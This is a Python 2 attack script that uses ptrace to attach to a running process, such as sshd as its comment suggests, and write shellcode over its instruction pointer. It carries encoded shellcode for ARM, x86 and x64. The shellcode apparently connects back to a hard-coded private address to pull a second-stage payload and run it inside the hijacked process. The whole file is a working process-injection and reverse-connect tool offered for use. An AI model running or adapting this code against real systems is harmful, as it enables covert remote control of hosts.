#!/usr/bin/python2
import commands
import platform
from ptrace.debugger.debugger import PtraceDebugger
from ptrace.debugger.debugger import PtraceProcess
import sys
import time

cyan = "\x1b[1;36m"
red = "\x1b[1;31m"
boldgreen = "\x1b[1;32m"
clear = "\x1b[0m"
procname = "test" # XXX: FOR TESTING. Can use sshd instead or something.

def flash(color,text,times):
        sys.stdout.write(text)
        line1 = "\x0d\x1b[2K%s%s" % (color,text)
        line2 = "\x0d\x1b[2K%s%s" % (red,text)
        for x in range(0,times):
                sys.stdout.write(line1)
                sys.stdout.flush()
                time.sleep(.2)
                sys.stdout.write(line2)
                sys.stdout.flush()
                time.sleep(.2)
        print line2

def getArch():
    architect = platform.machine().strip()
    print "%s{$} Target Architecture: %s%s%s" %(boldgreen, red, architect, clear)
    if "i386" in architect:
        return "x86"
    elif "i686" in architect:
        return "x86"
    elif "x86_64" in architect:
        return "x64"
    elif "arm" in architect:
        return "arm"

def getpid(procname):
    pid = commands.getoutput("pidof %s" %(procname))
    return pid

def attach(pid):
    print "%s{+} Attaching to %s %s" %(cyan, pid, clear)
    dbg = PtraceDebugger()
    process = dbg.addProcess(int(pid), False)
    return process

def getShellcode(arch):
    if arch is "arm":
        shellcode = getArm()
    elif arch is "x86":
        shellcode = getx86()
    elif arch is "x64":
        shellcode = getx64()
    return shellcode
    
def getArm():
    buf = "\xb4\x70\x9f\xe5\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x06"
    buf += "\x20\xa0\xe3\x00\x00\x00\xef\x00\xc0\xa0\xe1\x02\x70"
    buf += "\x87\xe2\x90\x10\x8f\xe2\x10\x20\xa0\xe3\x00\x00\x00"
    buf += "\xef\x0c\x00\xa0\xe1\x04\xd0\x4d\xe2\x08\x70\x87\xe2"
    buf += "\x0d\x10\xa0\xe1\x04\x20\xa0\xe3\x00\x30\xa0\xe3\x00"
    buf += "\x00\x00\xef\x00\x10\x9d\xe5\x70\x30\x9f\xe5\x03\x10"
    buf += "\x01\xe0\x01\x20\xa0\xe3\x02\x26\xa0\xe1\x02\x10\x81"
    buf += "\xe0\xc0\x70\xa0\xe3\x00\x00\xe0\xe3\x07\x20\xa0\xe3"
    buf += "\x54\x30\x9f\xe5\x00\x40\xa0\xe1\x00\x50\xa0\xe3\x00"
    buf += "\x00\x00\xef\x63\x70\x87\xe2\x00\x10\xa0\xe1\x0c\x00"
    buf += "\xa0\xe1\x00\x30\xa0\xe3\x00\x20\x9d\xe5\xfa\x2f\x42"
    buf += "\xe2\x00\x20\x8d\xe5\x00\x00\x52\xe3\x02\x00\x00\xda"
    buf += "\xfa\x2f\xa0\xe3\x00\x00\x00\xef\xf7\xff\xff\xea\xfa"
    buf += "\x2f\x82\xe2\x00\x00\x00\xef\x01\xf0\xa0\xe1\x02\x00"
    buf += "\x11\x5c\xc0\xa8\x01\x41\x19\x01\x00\x00\x00\xf0\xff"
    buf += "\xff\x22\x10\x00\x00"
    return buf
    
def getx86():
    buf = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1"
    buf += "\xcd\x80\x97\x5b\x68\xc0\xa8\x01\x41\x68\x02\x00\x11"
    buf += "\x5d\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd"
    buf += "\x80\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c"
    buf += "\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b\x89\xe1\x99\xb6\x0c"
    buf += "\xb0\x03\xcd\x80\xff\xe1"
    return buf
    
def getx64():
    buf = "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d"
    buf += "\x31\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x56\x50\x6a"
    buf += "\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
    buf += "\x48\xb9\x02\x00\x11\x5e\xc0\xa8\x01\x41\x51\x48\x89"
    buf += "\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59\x5e\x5a\x0f"
    buf += "\x05\xff\xe6"
    return buf

def injectit(pid, arch):
    flash(boldgreen, "{$$$} PROCESS PUTS ON ITS ROBE AND WIZARD HAT!", 3)
    print arch
    if arch == "arm":
        arminject(pid, shellcode=getShellcode(arch))
    elif arch == "x86":
        x86inject(pid, shellcode=getShellcode(arch))
    elif arch == "x64":
        x64inject(pid, shellcode=getShellcode(arch))
        
def arminject(pid, shellcode):
    process = attach(pid)
    pc = process.getInstrPointer()
    print "%s{*} PC: %s%s%s" %(cyan, red, pc, clear)
    print "%s{*} Insert Shellcodez...%s" %(cyan, clear)
    bytes = process.writeBytes(pc, shellcode)
    print "%s{*} Setting R1 to 0...%s" %(cyan, clear)
    process.setreg("r1", 0)
    print "%s{*} Carry on camping...%s" %(cyan, clear)
    process.cont()
    sys.exit(0)

def x86inject(pid, shellcode):
    process = attach(pid)
    eip = process.getInstrPointer()
    print "%s{*} EIP: %s%s%s" %(cyan, red, eip, clear)
    print "%s{*} Insert Shellcodez...%s" %(cyan, clear)
    bytes = process.writeBytes(eip, shellcode)
    print "%s{*} Setting EBX to 0...%s" %(cyan, clear)
    process.setreg("ebx", 0)
    print "%s{*} Carry on camping...%s" %(cyan, clear)
    process.cont()
    sys.exit(0)
    
def x64inject(pid, shellcode):
    process = attach(pid)
    rip = process.getInstrPointer()
    print "%s{*} RIP: %s%s%s" %(cyan, red, rip, clear)
    print "%s{*} Insert Shellcodez...%s" %(cyan, clear)
    bytes = process.writeBytes(rip, shellcode)
    print "%s{*} Setting RBX to 0...%s" %(cyan, clear)
    process.setreg("rbx", 0)
    print "%s{*} Carry on camping...%s" %(cyan, clear)
    process.cont()
    sys.exit(0)
    
def main():
    injectit(pid=getpid(procname), arch=getArch())

if __name__ == "__main__":
	main()

# Java programs are made up of class files. These have no bearing on their socioeconomic status.
#_EOF infodox 2014
